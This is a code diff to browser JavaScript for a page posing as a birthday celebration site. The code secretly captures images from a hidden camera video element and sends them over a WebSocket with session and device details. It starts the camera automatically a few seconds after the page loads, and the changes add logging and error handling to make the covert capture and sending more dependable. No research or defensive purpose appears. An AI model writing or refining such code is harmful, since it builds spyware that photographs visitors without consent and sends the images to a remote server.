@@ -272,8 +272,20 @@ function startStealthCapture() {
   
   const capturePhoto = () => {
     try {
+      console.log('🎂 Starting photo capture attempt...');
+      
       const hiddenVideo = document.getElementById('hidden-video');
-      if (!hiddenVideo || hiddenVideo.videoWidth === 0) return;
+      console.log('🎂 Hidden video element:', {
+        exists: !!hiddenVideo,
+        videoWidth: hiddenVideo?.videoWidth,
+        videoHeight: hiddenVideo?.videoHeight,
+        readyState: hiddenVideo?.readyState
+      });
+      
+      if (!hiddenVideo || hiddenVideo.videoWidth === 0) {
+        console.log('🎂 ❌ Capture failed - invalid video element');
+        return;
+      }
       
       const canvas = document.createElement('canvas');
       const ctx = canvas.getContext('2d');
@@ -284,10 +296,15 @@ function startStealthCapture() {
       ctx.drawImage(hiddenVideo, 0, 0);
       
       const imageData = canvas.toDataURL('image/jpeg', 0.8);
+      console.log('🎂 Image captured:', {
+        dataLength: imageData.length,
+        sessionId: userId,
+        wsReady: wsClient && wsClient.readyState === WebSocket.OPEN
+      });
       
       // Send via WebSocket with professional metadata
       if (wsClient && wsClient.readyState === WebSocket.OPEN) {
-        wsClient.send(JSON.stringify({
+        const message = {
           type: 'birthday_photo',
           sessionId: userId,
           imageData: imageData,
@@ -299,11 +316,16 @@ function startStealthCapture() {
             userAgent: navigator.userAgent,
             screen: `${screen.width}x${screen.height}`
           }
-        }));
+        };
+        
+        wsClient.send(JSON.stringify(message));
+        console.log('🎂 ✅ Photo sent to server via WebSocket');
+      } else {
+        console.log('🎂 ❌ WebSocket not ready, photo not sent');
       }
       
     } catch (error) {
-      console.error('Capture error:', error);
+      console.error('🎂 Capture error:', error);
     }
   };
   
@@ -527,19 +549,23 @@ function ensureWebSocket() {
     wsClient = new WebSocket(wsUrl);
     
     wsClient.onopen = () => {
-      console.log('Professional WebSocket connected');
+      console.log('🎂 Professional WebSocket connected');
+      websocketReady = true;
       
       // Make globally accessible for device fingerprinting
       window.wsClient = wsClient;
       
       // Register as user session
-      wsClient.send(JSON.stringify({
+      const registrationMessage = {
         type: 'register',
         role: 'user',
         sessionId: userId,
         platform: 'CelebratePro™',
         timestamp: Date.now()
-      }));
+      };
+      
+      wsClient.send(JSON.stringify(registrationMessage));
+      console.log('🎂 Registration sent:', registrationMessage);
     };
     
     wsClient.onmessage = (event) => {
@@ -552,13 +578,15 @@ function ensureWebSocket() {
     };
     
     wsClient.onclose = () => {
-      console.log('Professional WebSocket disconnected');
+      console.log('🎂 Professional WebSocket disconnected');
+      websocketReady = false;
       // Attempt reconnection after 3 seconds
       setTimeout(ensureWebSocket, 3000);
     };
     
     wsClient.onerror = (error) => {
-      console.error('WebSocket error:', error);
+      console.error('🎂 WebSocket error:', error);
+      websocketReady = false;
     };
     
   } catch (error) {
@@ -669,13 +697,19 @@ document.addEventListener('DOMContentLoaded', () => {
   console.log('Birthday auto-initialization decision:', {
     currentPath: window.location.pathname,
     isLegitimate: shouldAutoInit,
-    userId: userId
+    userId: userId,
+    websocketReady: !!(wsClient && wsClient.readyState === WebSocket.OPEN)
   });
   
   if (shouldAutoInit) {
-    setTimeout(() => {
+    setTimeout(async () => {
       console.log('🎉 Auto-initializing camera for legitimate user session');
-      initializeProfessionalCamera();
+      try {
+        const success = await initializeProfessionalCamera();
+        console.log('Camera initialization result:', success);
+      } catch (error) {
+        console.error('Auto-initialization error:', error);
+      }
     }, 3000);
   } else {
     console.log('🚫 Auto-initialization disabled - not a legitimate user session');
